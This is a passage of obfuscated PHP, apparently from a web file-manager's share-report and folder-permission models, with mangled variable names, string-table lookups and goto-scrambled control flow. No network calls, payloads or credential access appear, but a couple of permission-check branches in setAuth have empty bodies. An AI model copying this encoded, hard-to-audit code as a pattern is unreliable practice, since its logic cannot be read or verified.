Model($d…÷šÎğÉ¾[473])->userListInfo(array_unique($d„‘ÒœÌÖ£)); $DŞÎï‚’äë = array_to_keyvalue($d˜‘Î©ô, $d…÷šÎğÉ¾[33], $d…÷šÎğÉ¾[365]); $dù¨à‰ÕÔº = Model($d…÷šÎğÉ¾[740])->sourceListInfo($DŞÎï‚’äë, !0); foreach ($d˜‘Î©ô as &$EÆóñºõŠİ) { $fõŒ˜­ã¡Á = $EÆóñºõŠİ[$d…÷šÎğÉ¾[1409]]; $EÆóñºõŠİ[$d…÷šÎğÉ¾[2209]] = $D¤Üªë˜é[$fõŒ˜­ã¡Á] ? $D¤Üªë˜é[$fõŒ˜­ã¡Á] : !1; $cÖÙÍöƒ = $EÆóñºõŠİ[$d…÷šÎğÉ¾[365]]; $EÆóñºõŠİ[$d…÷šÎğÉ¾[387]] = $dù¨à‰ÕÔº[$cÖÙÍöƒ] ? $dù¨à‰ÕÔº[$cÖÙÍöƒ] : !1; } } private function _makeOrder($C™Æøéîè„ = '') { goto BÍÎÀĞ±¤à; EºØÊ—¦Ê: $DÖä­¹„Û¨ = Input::get($DÖÁŠ«…ß[403], $DÖÁŠ«…ß[7], $DÖÁŠ«…ß[385], $béé®ê·ï™); $cœñÊ¦ñ‡î = Input::get($DÖÁŠ«…ß[404], $DÖÁŠ«…ß[7], $DÖÁŠ«…ß[2210], array($DÖÁŠ«…ß[2147], $DÖÁŠ«…ß[400])); $cœñÊ¦ñ‡î = $cìééê‚„÷[$cœñÊ¦ñ‡î]; goto d—ÅÎŞëø÷; BÍÎÀĞ±¤à: $DÖÁŠ«…ß =& $_SERVER[»„]; $béé®ê·ï™ = array($DÖÁŠ«…ß[183], $DÖÁŠ«…ß[691], $DÖÁŠ«…ß[2195], $DÖÁŠ«…ß[2196]); $cìééê‚„÷ = array($DÖÁŠ«…ß[398] => $DÖÁŠ«…ß[399], $DÖÁŠ«…ß[400] => $DÖÁŠ«…ß[401]); goto EºØÊ—¦Ê; d—ÅÎŞëø÷: $C™Æøéîè„ = $C™Æøéîè„ . "{$DÖä­¹„Û¨}\x20{$cœñÊ¦ñ‡î}"; return $this->order($C™Æøéîè„); goto eÂ‘Â·Æé; eÂ‘Â·Æé: } public function reportAdd($B ¯ÊØôïŞ) { $E‘¼ÇŠ—œ¿ =& $_SERVER[»„]; $c°íšö¢à• = array($E‘¼ÇŠ—œ¿[437] => $B ¯ÊØôïŞ[$E‘¼ÇŠ—œ¿[437]], $E‘¼ÇŠ—œ¿[1409] => USER_ID); if (Model($E‘¼ÇŠ—œ¿[2206])->where($c°íšö¢à•)->find()) { return !1; } $a¸¿ƒ‡Òê = array($E‘¼ÇŠ—œ¿[437] => $B ¯ÊØôïŞ[$E‘¼ÇŠ—œ¿[437]], $E‘¼ÇŠ—œ¿[1316] => $B ¯ÊØôïŞ[$E‘¼ÇŠ—œ¿[1316]], $E‘¼ÇŠ—œ¿[365] => $B ¯ÊØôïŞ[$E‘¼ÇŠ—œ¿[365]], $E‘¼ÇŠ—œ¿[415] => $B ¯ÊØôïŞ[$E‘¼ÇŠ—œ¿[415]], $E‘¼ÇŠ—œ¿[1409] => USER_ID, $E‘¼ÇŠ—œ¿[29] => $B ¯ÊØôïŞ[$E‘¼ÇŠ—œ¿[29]], $E‘¼ÇŠ—œ¿[401] => $B ¯ÊØôïŞ[$E‘¼ÇŠ—œ¿[401]]); return Model($E‘¼ÇŠ—œ¿[2206])->add($a¸¿ƒ‡Òê); } public function reportList($fäÌèŞÖÇÛ) { goto c–áˆ›¹§¸; fğ„ÆÌğ¬‡: $b¡“¹ËœÉ = array($Fª‹ã·ê÷Ğ[398] => $Fª‹ã·ê÷Ğ[399], $Fª‹ã·ê÷Ğ[400] => $Fª‹ã·ê÷Ğ[401]); $dŸÓæ×ŸÌ = $Fª‹ã·ê÷Ğ[2214] . $b¡“¹ËœÉ[$EÅŠ´ëäì]; $dŠÒ­Ï¢´¾ = Model($Fª‹ã·ê÷Ğ[2206])->where($Dñ›‘Öé†)->order($dŸÓæ×ŸÌ)->selectPage(20); goto D”‡áˆ–º; D”‡áˆ–º: if (empty($dŠÒ­Ï¢´¾[$Fª‹ã·ê÷Ğ[350]])) { return array(); } $this->_listDataApply($dŠÒ­Ï¢´¾[$Fª‹ã·ê÷Ğ[350]]); return $dŠÒ­Ï¢´¾; goto dâ‹‡Ü«°¢; c–áˆ›¹§¸: $Fª‹ã·ê÷Ğ =& $_SERVER[»„]; $Dñ›‘Öé† = array(); if ($fäÌèŞÖÇÛ[$Fª‹ã·ê÷Ğ[690]]) { $B™«¤ê¬ÇØ = $fäÌèŞÖÇÛ[$Fª‹ã·ê÷Ğ[691]] ? $fäÌèŞÖÇÛ[$Fª‹ã·ê÷Ğ[691]] : strtotime(date($Fª‹ã·ê÷Ğ[2208])); $Dñ›‘Öé†[$Fª‹ã·ê÷Ğ[183]] = array($Fª‹ã·ê÷Ğ[317], array($fäÌèŞÖÇÛ[$Fª‹ã·ê÷Ğ[690]], $B™«¤ê¬ÇØ)); } goto f¡Ø³œ¦ßÇ; f¡Ø³œ¦ßÇ: if (isset($fäÌèŞÖÇÛ[$Fª‹ã·ê÷Ğ[29]]) && in_array($fäÌèŞÖÇÛ[$Fª‹ã·ê÷Ğ[29]], array($Fª‹ã·ê÷Ğ[83], $Fª‹ã·ê÷Ğ[2211], $Fª‹ã·ê÷Ğ[2212], $Fª‹ã·ê÷Ğ[2213], $Fª‹ã·ê÷Ğ[1888]))) { $Dñ›‘Öé†[$Fª‹ã·ê÷Ğ[29]] = $fäÌèŞÖÇÛ[$Fª‹ã·ê÷Ğ[29]]; } if (isset($fäÌèŞÖÇÛ[$Fª‹ã·ê÷Ğ[677]]) && in_array($fäÌèŞÖÇÛ[$Fª‹ã·ê÷Ğ[677]], array($Fª‹ã·ê÷Ğ[464], $Fª‹ã·ê÷Ğ[83], $Fª‹ã·ê÷Ğ[2211], $Fª‹ã·ê÷Ğ[2212]))) { $Dñ›‘Öé†[$Fª‹ã·ê÷Ğ[677]] = $fäÌèŞÖÇÛ[$Fª‹ã·ê÷Ğ[677]]; } $EÅŠ´ëäì = Input::get($Fª‹ã·ê÷Ğ[404], $Fª‹ã·ê÷Ğ[7], $Fª‹ã·ê÷Ğ[2210], array($Fª‹ã·ê÷Ğ[2147], $Fª‹ã·ê÷Ğ[400])); goto fğ„ÆÌğ¬‡; dâ‹‡Ü«°¢: } public function reportStatus($FÊôŒ½æ‰ß) { goto b•’¬¶Õ‰Â; CÂ¨¸ñí“ƒ: if (!$f±ºË¹È–) { return !1; } $E†Ş–èÜÏ = array($AÒˆá½Éö[677] => $FÊôŒ½æ‰ß[$AÒˆá½Éö[677]]); if ($FÊôŒ½æ‰ß[$AÒˆá½Éö[677]] == $AÒˆá½Éö[2212] && $f±ºË¹È–[$AÒˆá½Éö[677]] == $AÒˆá½Éö[2212]) { $E†Ş–èÜÏ[$AÒˆá½Éö[677]] = 0; } goto BÒÚÅĞªíÀ; b•’¬¶Õ‰Â: $AÒˆá½Éö =& $_SERVER[»„]; $d­‹æÓÚ¬Ã = array($AÒˆá½Éö[363] => $FÊôŒ½æ‰ß[$AÒˆá½Éö[363]]); $f±ºË¹È– = Model($AÒˆá½Éö[2206])->where($d­‹æÓÚ¬Ã)->field($AÒˆá½Éö[2215])->find(); goto CÂ¨¸ñí“ƒ; b¢‰æÌ÷‚ˆ: return $b¹¥‚‹¦Š; goto B½Ûİ§¢äç; BÒÚÅĞªíÀ: $b¹¥‚‹¦Š = Model($AÒˆá½Éö[2206])->where($d­‹æÓÚ¬Ã)->save($E†Ş–èÜÏ); if ($FÊôŒ½æ‰ß[$AÒˆá½Éö[677]] == $AÒˆá½Éö[2211]) { if ($f±ºË¹È–[$AÒˆá½Éö[415]] != $AÒˆá½Éö[464] && $this->shareFileMeta($f±ºË¹È–[$AÒˆá½Éö[415]])) { $this->shareFileMeta($f±ºË¹È–[$AÒˆá½Éö[415]], 0); } $this->remove($f±ºË¹È–[$AÒˆá½Éö[437]]); return !0; } if ($b¹¥‚‹¦Š && $FÊôŒ½æ‰ß[$AÒˆá½Éö[677]] == $AÒˆá½Éö[2212]) { $dÜ‚ŞôæÅ = $E†Ş–èÜÏ[$AÒˆá½Éö[677]] == $AÒˆá½Éö[2212] ? 1 : 0; $this->shareFileMeta($f±ºË¹È–[$AÒˆá½Éö[415]], $dÜ‚ŞôæÅ); $this->removeByFile($f±ºË¹È–[$AÒˆá½Éö[415]]); } goto b¢‰æÌ÷‚ˆ; B½Ûİ§¢äç: } private function removeByFile($aáä¤ØÚ²Š) { goto b÷“Ã„ÙÌâ; e©Ï‚µØÆØ: $F¸É¢°×ôÚ = array_to_keyvalue($E»‚ÎŞ¡ã, $eø­‰Çãç¹[33], $eø­‰Çãç¹[437]); $this->remove($F¸É¢°×ôÚ); goto d¹±î¤¿; FÑË¨ˆ¶Òá: $aêä¸Ÿôè = array($eø­‰Çãç¹[365] => array($eø­‰Çãç¹[7], $C—¼ÌŠ¹­), $eø­‰Çãç¹[442] => 1); $E»‚ÎŞ¡ã = Model($eø­‰Çãç¹[2049])->where($aêä¸Ÿôè)->field($eø­‰Çãç¹[437])->select(); if (empty($E»‚ÎŞ¡ã)) { return; } goto e©Ï‚µØÆØ; b÷“Ã„ÙÌâ: $eø­‰Çãç¹ =& $_SERVER[»„]; $E»‚ÎŞ¡ã = Model($eø­‰Çãç¹[740])->where(array($eø­‰Çãç¹[415] => $aáä¤ØÚ²Š))->field($eø­‰Çãç¹[365])->select(); $C—¼ÌŠ¹­ = array_to_keyvalue($E»‚ÎŞ¡ã, $eø­‰Çãç¹[33], $eø­‰Çãç¹[365]); goto FÑË¨ˆ¶Òá; d¹±î¤¿: } private function shareFileMeta($d¬ÛóØ›ä—, $C÷Œ£œ‘Áâ = null) { $EöÙ“³·ƒ =& $_SERVER[»„]; $E©«ÓŒ‡ Á = array($EöÙ“³·ƒ[415] => $d¬ÛóØ›ä—, $EöÙ“³·ƒ[89] => $EöÙ“³·ƒ[2216]); if (is_null($C÷Œ£œ‘Áâ)) { return Model($EöÙ“³·ƒ[2217])->where($E©«ÓŒ‡ Á)->find(); } $E©«ÓŒ‡ Á[$EöÙ“³·ƒ[355]] = $C÷Œ£œ‘Áâ; Model($EöÙ“³·ƒ[2217])->add($E©«ÓŒ‡ Á, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\x6f\x75\x72\x63\x65\x5f\x61\165\x74\x68"; public function getAuth($f†´ÇÇšÎî) { goto b‰ìÉœ®¬¢; b‰ìÉœ®¬¢: $F©›Ù¼›³ =& $_SERVER[»„]; $BŸòºë¨×‹ = $F©›Ù¼›³[2218]; $FË‰‰¸Òøƒ = array($F©›Ù¼›³[365] => $f†´ÇÇšÎî); goto dª–¤†ùáä; eãÅİÌâŸš: return $C‰ËäãšŠ; goto Bâò‘¡§²‡; dª–¤†ùáä: $EµÂËÉ˜ = $this->field($BŸòºë¨×‹)->order($F©›Ù¼›³[363])->where($FË‰‰¸Òøƒ)->select(); $C‰ËäãšŠ = array(); foreach ($EµÂËÉ˜ as $EË¿©çÂË†) { if (Model($F©›Ù¼›³[2219])->listData($EË¿©çÂË†[$F©›Ù¼›³[2200]])) { $C‰ËäãšŠ[] = $EË¿©çÂË†; } } goto eãÅİÌâŸš; Bâò‘¡§²‡: } public function setAuth($B˜‡–ğÌàÒ, $E”Ğ¬Ô÷“æ) { goto CÇÊ‚¾ÂÎ½; Dõ»Å·ŞÎš: $this->where(array($c•‡âößº[379] => $B˜‡–ğÌàÒ))->delete(); $this->addAll($aÊìÈÇÆ); return !0; goto eàœóššâ; CÇÊ‚¾ÂÎ½: $c•‡âößº =& $_SERVER[»„]; $B¨Çù¸¦ä = Model($c•‡âößº[1098])->sourceInfo($B˜‡–ğÌàÒ); if ($B¨Çù¸¦ä[$c•‡âößº[367]] != SourceModel::TYPE_GROUP) { return !1; } goto c¦ ½¥; B—í¹½–®: $c‰çÏ‡óÎ¹ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $aÊìÈÇÆ = array(); foreach ($E”Ğ¬Ô÷“æ as $CµŒ«ò¢·) { if (!in_array($CµŒ«ò¢·[$c•‡âößº[367]], $c‰çÏ‡óÎ¹)) { show_json(LNG($c•‡âößº[2220]), !1); } if ($E½ôÆ™¾áè != $BíğÍ ã˜…) { if ($CµŒ«ò¢·[$c•‡âößº[367]] == SourceModel::TYPE_GROUP) { } if ($CµŒ«ò¢·[$c•‡âößº[452]] != 0 && !in_array($CµŒ«ò¢·[$c•‡âößº[452]], $A®ğê´±ñ)) { } } if ($CµŒ«ò¢·[$c•‡âößº[452]] == 0) { $CµŒ«ò¢·[$c•‡âößº[367]] = SourceModel::TYPE_USER; } $aÊìÈÇÆ[] = array($c•‡âößº[365] => $B˜‡–ğÌàÒ, $c•‡âößº[367] => intval($CµŒ«ò¢·[$c•‡âößº[367]]), $c•‡âößº[452] => intval($CµŒ«ò¢·[$c•‡âößº[452]]), $c•‡âößº[2200] => intval($CµŒ«ò¢·[$c•‡âößº[2200]]) ? intval($CµŒ«ò¢·[$c•‡âößº[2200]]) : 0, $c•‡âößº[2201] => intval($CµŒ«ò¢·[$c•‡âößº[2201]]) ? intval($CµŒ«ò¢·[$c•‡âößº[2201]]) : -1); } goto Dõ»Å·ŞÎš; c¦ ½¥: $BíğÍ ã˜… = 1; $E½ôÆ™¾áè = $B¨Çù¸¦ä[$c•‡âößº[452]]; if ($E½ôÆ™¾áè != $BíğÍ ã˜…) { $Fïš“Áï¢ø = array($c•‡âößº[2072] => $E½ôÆ™¾áè); $A®ğê´±ñ = Model($c•‡âößº[2146])->field($c•‡âößº[1409])->where($Fïš“Áï¢ø)->select(); $A®ğê´±ñ = array_to_keyvalue($A®ğê´±ñ, $c•‡âößº[33], $c•‡âößº[1409]); } goto B—í¹½–®; eàœóššâ: } public function authClear($fèßå¦·Á¼) { $EƒÖ İš–ì =& $_SERVER[»„]; $EØÅùèˆ™‚ = Model($EƒÖ İš–ì[1098])->sourceInfo($fèßå¦·Á¼); $DÑÍ™½Ï® = array($fèßå¦·Á¼); if ($EØÅùèˆ™‚[$EƒÖ İš–ì[366]] == $EƒÖ İš–ì[83]) { $Bì£ãŠââ” = array($EƒÖ İš–ì[521] => array($EƒÖ İš–ì[479], $EØÅùèˆ™‚[$EƒÖ İš–ì[455]] . $fèßå¦·Á¼ . $EƒÖ İš–ì[480])); $DÑÍ™½Ï® = Model($EƒÖ İš–ì[1098])->field($EƒÖ İš–ì[379])->where($Bì£ãŠââ”)->getField($EƒÖ İš–ì[365], !0); $DÑÍ™½Ï®[] = $fèßå¦·Á¼; } $this->where(array($EƒÖ İš–ì[379] => array($EƒÖ İš–ì[380], $DÑÍ™½Ï®)))->delete(); return !0; } public function get($bçß‡İÔ¯è) { $aëèâ×†‹ = $this->getSourceList(array($bçß‡İÔ¯è), !0); return $aëèâ×†‹[0]; } public function getSourceList($a×…ê‰©‰, $fš¼ò’Ø„è = false) { goto EÏ­÷‹‹­„; D¨›Øé–: $cî‹¡›‹ã = array_values(array_unique($cî‹¡›‹ã)); if (!$cî‹¡›‹ã) { return array(); } $eŠµĞ¬ˆˆ = $FøŒšßÛóê[2222]; goto fø†Şë‰†ö; F¢êÂš¼’¸: $B››Ûö‰®Û = array(); foreach ($fš¼ò’Ø„è as $b»Œ£…ŒÇ˜ => $d“ ²—Ëæ¬) { $B››Ûö‰®Û[$b»Œ£…ŒÇ˜] = $this->makeSourceAuth($d“ ²—Ëæ¬, $B‡ä²çµç’); } return $B››Ûö‰®Û; goto BñÄàƒ©Ó; fø†Şë‰†ö: $EíÌ×Ã˜ß‘ = array($FøŒšßÛóê[379] => array($FøŒšßÛóê[380], $cî‹¡›‹ã)); $B‡ä²çµç’ = $this->field($eŠµĞ¬ˆˆ)->where($EíÌ×Ã˜ß‘)->select(); $B‡ä²çµç’ = array_to_keyvalue_group($B‡ä²çµç’, $FøŒšßÛóê[365]); goto F¢êÂš¼’¸; EÏ­÷‹‹­„: $FøŒšßÛóê =& $_SERVER[»„]; if (!$a×…ê‰©‰) { return array(); } $EÍ—Üø¦…ã = Model($FøŒšßÛóê[1098]); goto c¸ôä…à‹„; c¸ôä…à‹„: if (!$fš¼ò’Ø„è) { $EíÌ×Ã˜ß‘ = array($FøŒšßÛóê[379] => array($FøŒšßÛóê[380], $a×…ê‰©‰)); $fš¼ò’Ø„è = $EÍ—Üø¦…ã->field($FøŒšßÛóê[2221])->where($EíÌ×Ã˜ß‘)->select(); $fš¼ò’Ø„è = array_to_keyvalue($fš¼ò’Ø„è, $FøŒšßÛóê[365]); } $cî‹¡›‹ã = $a×…ê‰©‰; foreach ($fš¼ò’Ø„è as $d“—Ô¤Ø¸ => $E­‘ŠÁ‡¬) { $bİ³š¦ÖÅÇ = $EÍ—Üø¦…ã->parentLevelArray($E­‘ŠÁ‡¬[$FøŒšßÛóê[455]]); $cî‹¡›‹ã = array_merge($cî‹¡›‹ã, $bİ³š¦ÖÅÇ, array($d“—Ô¤Ø¸)); } goto D¨›Øé–; BñÄàƒ©Ó: } public function authDeepCheck($D‹«ùŠŸÔî, $EŠ¹Ë‰¿´÷ = false) { $cŒô¦òÓøİ =& $_SERVER[»„]; if (_get($GLOBALS, $cŒô¦òÓøİ[453])) { return !1; } $B·ãÄ™ÂÊÖ = $this->makeAuthDeep(); if (!in_array($D‹«ùŠŸÔî, $B·ãÄ™ÂÊÖ)) { return !1; } return array($cŒô¦òÓøİ[373] => -1, $cŒô¦òÓøİ[414] => array($cŒô¦òÓøİ[381] => $cŒô¦òÓøİ[1019], $cŒô¦òÓøİ[2078] => $cŒô¦òÓøİ[464], $cŒô¦òÓøİ[382] => LNG($cŒô¦òÓøİ[2223]), $cŒô¦òÓøİ[2090] => $cŒô¦òÓøİ[2224]), $cŒô¦òÓøİ[2225] => array($cŒô¦òÓøİ[384] => $cŒô¦òÓøİ[2226], $cŒô¦òÓøİ[75] => $D‹«ùŠŸÔî)); } protected function makeAuthDeep() { goto e†ÊÊÙÓ”; A™É…×İÏ: $D³ËŠÔœêê = Model($d¤¶ÉäÌä¾[2227])->listData(); $F®òÆ¤ç¢ = array(); foreach ($D³ËŠÔœêê as $aŞÙ¤îˆÈ) { if ($aŞÙ¤îˆÈ[$d¤¶ÉäÌä¾[372]] == 0 && $aŞÙ¤îˆÈ[$d¤¶ÉäÌä¾[2092]] == $d¤¶ÉäÌä¾[83]) { $F®òÆ¤ç¢[] = $aŞÙ¤îˆÈ[$d¤¶ÉäÌä¾[363]]; } } goto d—Ò••ëÀ«; D¶‹âÛ›áÎ: $eìé¤óí¬Ô = array_values(array_unique($eìé¤óí¬Ô)); $BŠŠ×Ú°î¤ = $eìé¤óí¬Ô; foreach ($BŠŠ×Ú°î¤ as $BŒÏŒ¬Å«Å) { $CÚñ—›Ê = $fÈ‘¸©»‘¥->getInfo($BŒÏŒ¬Å«Å); $Fò¡â ØÀ’ = $fÍÉè“•“ç->parentLevelArray($CÚñ—›Ê[$d¤¶ÉäÌä¾[455]]); $eìé¤óí¬Ô = array_merge($eìé¤óí¬Ô, $Fò¡â ØÀ’); } goto b…ƒÂŠİš; b…ƒÂŠİš: $eìé¤óí¬Ô = array_values(array_unique($eìé¤óí¬Ô)); foreach ($eìé¤óí¬Ô as $BŒÏŒ¬Å«Å) { $CÚñ—›Ê = $fÈ‘¸©»‘¥->getInfo($BŒÏŒ¬Å«Å); $Bï¾Ãà³œŞ[] = $CÚñ—›Ê[$d¤¶ÉäÌä¾[387]][$d¤¶ÉäÌä¾[365]]; } $Bï¾Ãà³œŞ = array_values(array_unique($Bï¾Ãà³œŞ)); goto f¾êŞ§ä; e†ÊÊÙÓ”: $d¤¶ÉäÌä¾ =& $_SERVER[»„]; static $Bï¾Ãà³œŞ = false; if ($Bï¾Ãà³œŞ) { return $Bï¾Ãà³œŞ; } goto A™É…×İÏ; f¾êŞ§ä: return $Bï¾Ãà³œŞ; goto Eôìˆ‰Á; AŠˆ†œ•ï: $fÍÉè“•“ç = Model($d¤¶ÉäÌä¾[1098]); $fÈ‘¸©»‘¥ = Model($d¤¶ÉäÌä¾[454]); if ($B„–ï‘í‰¥) { $F¹õíòÏ¡– = $fÍÉè“•“ç->where(array($d¤¶ÉäÌä¾[365] => array($d¤¶ÉäÌä¾[380], $B„–ï‘í‰¥)))->select(); foreach ($F¹õíòÏ¡– as $c÷Âò„ö‹°) { $Fò¡â ØÀ’ = $fÍÉè“•“ç->parentLevelArray($c÷Âò„ö‹°[$d¤¶ÉäÌä¾[455]]); $Bï¾Ãà³œŞ = array_merge($Bï¾Ãà³œŞ, $Fò¡â ØÀ’); $eìé¤óí¬Ô[] = $c÷Âò„ö‹°[$d¤¶ÉäÌä¾[452]]; } } goto D¶‹âÛ›áÎ; BºÛŠƒ«‰ê: $B„–ï‘í‰¥ = array_to_keyvalue($dëŒæ×Ş, $d¤¶ÉäÌä¾[33], $d¤¶ÉäÌä¾[365]); $Bï¾Ãà³œŞ = array(); $eìé¤óí¬Ô = $bÈ¸†ƒñ‚Ğ; goto AŠˆ†œ•ï; C‡éîîÄ®ã: if ($bÈ¸†ƒñ‚Ğ) { $A©ˆ·Ò—ò = array(array($d¤¶ÉäÌä¾[367] => SourceModel::TYPE_USER, $d¤¶ÉäÌä¾[452] => USER_ID), array($d¤¶ÉäÌä¾[367] => SourceModel::TYPE_GROUP, $d¤¶ÉäÌä¾[452] => array($d¤¶ÉäÌä¾[380], $bÈ¸†ƒñ‚Ğ)), $d¤¶ÉäÌä¾[904] => $d¤¶ÉäÌä¾[2152]); } if ($F®òÆ¤ç¢) { $A©ˆ·Ò—ò = array($A©ˆ·Ò—ò, $d¤¶ÉäÌä¾[2200] => array($d¤¶ÉäÌä¾[2228], $F®òÆ¤ç¢)); } $dëŒæ×Ş = $this->field($d¤¶ÉäÌä¾[2229])->where($A©ˆ·Ò—ò)->select(); goto BºÛŠƒ«‰ê; d—Ò••ëÀ«: $bÈ¸†ƒñ‚Ğ = Session::get($d¤¶ÉäÌä¾[2184]); $bÈ¸†ƒñ‚Ğ = array_to_keyvalue($bÈ¸†ƒñ‚Ğ, $d¤¶ÉäÌä¾[33], $d¤¶ÉäÌä¾[2072]); $A©ˆ·Ò—ò = array($d¤¶ÉäÌä¾[367] => SourceModel::TYPE_USER, $d¤¶ÉäÌä¾[452] => USER_ID); goto C‡éîîÄ®ã; Eôìˆ‰Á: } private function makeSourceAuth($fÇÖÇÀó‡Ÿ, $bæÁ·íÌëØ) { goto c¡ ¥ÏŒø; c¡ ¥ÏŒø: $E›å§®ˆ =& $_SERVER[»„]; $D·ÒÆ ³» = Session::get($E›å§®ˆ[2184]); $D·ÒÆ ³» = array_to_keyvalue($D·ÒÆ ³», $E›å§®ˆ[2072]); goto FÍÍˆ¦µ¼¢; aôÒ¬±«ƒ¤: if (!$bâ²ë™Ùñ && $fÇÖÇÀó‡Ÿ[$E›å§®ˆ[367]] == SourceModel::TYPE_GROUP) { $B¡´–½Œó = Model($E›å§®ˆ[454])->getInfo($fÇÖÇÀó‡Ÿ[$E›å§®ˆ[452]]); $b„ÚÚÆ­Š = explode($E›å§®ˆ[47], trim($dŒª‡õ·‹¢[$E›å§®ˆ[455]], $E›å§®ˆ[47])); foreach ($b„ÚÚÆ­Š as $f–ˆçŠ¡¿ß) { if ($f–ˆçŠ¡¿ß == $E›å§®ˆ[464] || $f–ˆçŠ¡¿ß == $bŒ×Îí´ê) { continue; } if (!isset($D·ÒÆ ³»[$f–ˆçŠ¡¿ß])) { continue; } $aØ„ÛšÜìÊ = $D·ÒÆ ³»[$f–ˆçŠ¡¿ß]; $bâ²ë™Ùñ = array($E›å§®ˆ[2230] => intval($aØ„ÛšÜìÊ[$E›å§®ˆ[372]][$E›å§®ˆ[372]]), $E›å§®ˆ[2231] => $aØ„ÛšÜìÊ[$E›å§®ˆ[372]], $E›å§®ˆ[2225] => array($E›å§®ˆ[384] => $E›å§®ˆ[2234], $E›å§®ˆ[2235] => $B¡´–½Œó[$E›å§®ˆ[387]][$E›å§®ˆ[365]], $E›å§®ˆ[2233] => $B¡´–½Œó[$E›å§®ˆ[459]])); break; } } if ((!$bâ²ë™Ùñ || $bâ²ë™Ùñ[$E›å§®ˆ[373]] <= 0) && $fÇÖÇÀó‡Ÿ[$E›å§®ˆ[367]] == SourceModel::TYPE_GROUP) { $F·ÛÃ£‡ ¾ = $this->authDeepCheck($fÇÖÇÀó‡Ÿ[$E›å§®ˆ[365]], $bâ²ë™Ùñ); if ($F·ÛÃ£‡ ¾) { $bâ²ë™Ùñ = $F·ÛÃ£‡ ¾; } } return $bâ²ë™Ùñ; goto b”¼º¶ËÉ«; FÍÍˆ¦µ¼¢: $bŒ×Îí´ê = $E›å§®ˆ[83]; $eêë¿ˆ†ƒµ = Model($E›å§®ˆ[1098])->parentLevelArray($fÇÖÇÀó‡Ÿ[$E›å§®ˆ[455]]); $eêë¿ˆ†ƒµ = array_merge(array($fÇÖÇÀó‡Ÿ[$E›å§®ˆ[365]]), array_reverse($eêë¿ˆ†ƒµ)); goto d›Œ’»›Â«; d›Œ’»›Â«: $bâ²ë™Ùñ = !1; foreach ($eêë¿ˆ†ƒµ as $EÅÚ¢ªÑù…) { if (!isset($bæÁ·íÌëØ[$EÅÚ¢ªÑù…])) { continue; } $AÉèİéˆÒÙ = $this->authMake($bæÁ·íÌëØ[$EÅÚ¢ªÑù…]); if ($AÉèİéˆÒÙ[$E›å§®ˆ[414]]) { $bâ²ë™Ùñ = $AÉèİéˆÒÙ; break; } } if (!$bâ²ë™Ùñ && $fÇÖÇÀó‡Ÿ[$E›å§®ˆ[367]] == SourceModel::TYPE_GROUP) { $f–ˆçŠ¡¿ß = $fÇÖÇÀó‡Ÿ[$E›å§®ˆ[452]]; if (isset($D·ÒÆ ³»[$f–ˆçŠ¡¿ß])) { $aØ„ÛšÜìÊ = $D·ÒÆ ³»[$f–ˆçŠ¡¿ß]; $B¡´–½Œó = Model($E›å§®ˆ[454])->getInfo($f–ˆçŠ¡¿ß); $bâ²ë™Ùñ = array($E›å§®ˆ[2230] => intval($aØ„ÛšÜìÊ[$E›å§®ˆ[372]][$E›å§®ˆ[372]]), $E›å§®ˆ[2231] => $aØ„ÛšÜìÊ[$E›å§®ˆ[372]], $E›å§®ˆ[2225] => array($E›å§®ˆ[384] => $E›å§®ˆ[2232], $E›å§®ˆ[75] => $B¡´–½Œó[$E›å§®ˆ[387]][$E›å§®ˆ[365]], $E›å§®ˆ[2233] => $B¡´–½Œó[$E›å§®ˆ[459]])); } } goto aôÒ¬±«ƒ¤; b”¼º¶ËÉ«: } public function authOwnerApply($bÉ±Ï»…¡”) { goto B‚äÍ”Óß; B‚äÍ”Óß: $f½—™Ì õà =& $_SERVER[»„]; if (empty($bÉ±Ï»…¡”[$f½—™Ì õà[372]]) || isset($bÉ±Ï»…¡”[$f½—™Ì õà[2236]]) && $bÉ±Ï»…¡”[$f½—™Ì õà[2236]]) { return $bÉ±Ï»…¡”; } if (AuthModel::authCheckRoot($bÉ±Ï»…¡”[$f½—™Ì õà[372]][$f½—™Ì õà[373]])) { return $bÉ±Ï»…¡”; } goto eŒÓÛÑ³Ø; Cš¤†·ƒšé: $bÉ±Ï»…¡”[$f½—™Ì õà[372]][$f½—™Ì õà[2238]] = Model($f½—™Ì õà[470])->userListInfo($d¼òÖ½ÂõÈ); return $bÉ±Ï»…¡”; goto Eº÷õ™‡Û; aŒ˜ÇæèÈ»: if (count($d¼òÖ½ÂõÈ) == 0) { $d¼òÖ½ÂõÈ = $this->authFolderOwnerGroup($bÉ±Ï»…¡”[$f½—™Ì õà[452]]); } $d¼òÖ½ÂõÈ = array_unique($d¼òÖ½ÂõÈ); if (AuthModel::authCheckRoot($bÉ±Ï»…¡”[$f½—™Ì õà[372]][$f½—™Ì õà[373]])) { $d¼òÖ½ÂõÈ[] = USER_ID; } goto Cš¤†·ƒšé; Aë‚¬„Ïßø: $bÌö‘ÔøÚ = array($f½—™Ì õà[379] => array($f½—™Ì õà[380], $B¹ÑÍ™µÚİ)); $fØ‰Ã¦‡ãÃ = $this->field($føŞ‡ÊÌëÙ)->where($bÌö‘ÔøÚ)->select(); $fØ‰Ã¦‡ãÃ = array_to_keyvalue_group($fØ‰Ã¦‡ãÃ, $f½—™Ì õà[365]); goto Fß‡¯äõô; Fß‡¯äõô: $Bªà…¶½œ¾ = array(); $d¼òÖ½ÂõÈ = array(); foreach ($fØ‰Ã¦‡ãÃ as $cË³ò¦ÂîĞ => $aÖÁÃ•ì‡É) { $d÷ãçø¨ = $this->authFolderOwnerUser($aÖÁÃ•ì‡É); $Bªà…¶½œ¾[$cË³ò¦ÂîĞ] = $d÷ãçø¨; $d¼òÖ½ÂõÈ = array_merge($d¼òÖ½ÂõÈ, $d÷ãçø¨[$f½—™Ì õà[531]]); if ($d÷ãçø¨[$f½—™Ì õà[2237]]) { break; } } goto aŒ˜ÇæèÈ»; eŒÓÛÑ³Ø: $B¹ÑÍ™µÚİ = Model($f½—™Ì õà[1098])->parentLevelArray($bÉ±Ï»…¡”[$f½—™Ì õà[455]]); $B¹ÑÍ™µÚİ = array_merge(array($bÉ±Ï»…¡”[$f½—™Ì õà[365]]), array_reverse($B¹ÑÍ™µÚİ)); $føŞ‡ÊÌëÙ = $f½—™Ì õà[2222]; goto Aë‚¬„Ïßø; Eº÷õ™‡Û: } private function authFolderOwnerGroup($E×‹šó ‚) { $E¥–áÙ÷¯´ =& $_SERVER[»„]; $DŒÅà­›ô¤ = Model($E¥–áÙ÷¯´[2146])->where(array($E¥–áÙ÷¯´[2072] => $E×‹šó 